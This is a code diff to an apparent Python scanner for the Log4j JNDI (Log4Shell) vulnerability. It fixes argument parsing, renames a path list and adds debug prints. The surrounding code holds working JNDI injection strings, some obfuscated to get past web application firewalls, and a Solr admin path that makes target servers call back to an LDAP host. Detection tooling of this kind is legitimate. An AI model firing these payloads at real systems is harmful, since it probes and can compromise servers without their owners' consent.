@@ -62,7 +62,7 @@ protocols = [f"jndi:ldap:",
             f'j${{::-nD}}i${{::-:}}',
             f'j${{EnV:K5:-nD}}i:ldap:',]
 
-paths = ['/',
+all_paths = ['/',
     f'/solr/admin/collections?action=${{jndi:ldap://{{callback_host}}/{{random}}}}',
     f'/$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//{{callback_host}}/{{random}}%7B'
 ]
@@ -142,14 +142,14 @@ parser.add_argument("--workers",
                     action='store',
                     default=10)
 parser.add_argument("--timeout",
-                    dest="workers",
+                    dest="timeout",
                     help="Scan The Domains/Sites Typical Ports.",
                     action='store',
                     default=0.2)
 
-timeout = float(args.timeout)
-
 args = parser.parse_args()
+
+timeout = float(args.timeout)
 
 futures = []
 
@@ -181,8 +181,8 @@ def generate_waf_bypass_payloads(callback_host, random_string):
     return payloads
 
 def generate_path_payloads(callback_host, random_string):
-    global paths
-    paths = [p.replace(f'{{callback_host}}', callback_host).replace(f'{{random}}', random_string) for p in paths]
+    global all_paths
+    paths = [p.replace(f'{{callback_host}}', callback_host).replace(f'{{random}}', random_string) for p in all_paths]
     return paths
 
 class Dnslog(object):
@@ -305,7 +305,10 @@ def scan_url(url, callback_host):
         headers = get_fuzzing_headers(payload)
         if args.request_type.upper() == "GET" or args.run_all_tests:
             for path in paths:
-                future = async_session.get(url=url+path,
+                print(url)
+                print(path)
+                get_url = f'{url}{path}'
+                future = async_session.get(url=get_url,
                                 headers=headers,
                                 verify=False,
                                 timeout=timeout)
@@ -315,7 +318,8 @@ def scan_url(url, callback_host):
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
             for path in paths:
-                future = async_session.post(url=url+path,
+                post_url = f'{url}{path}'
+                future = async_session.post(url=post_url,
                                 headers=headers,
                                 verify=False,
                                 timeout=timeout)
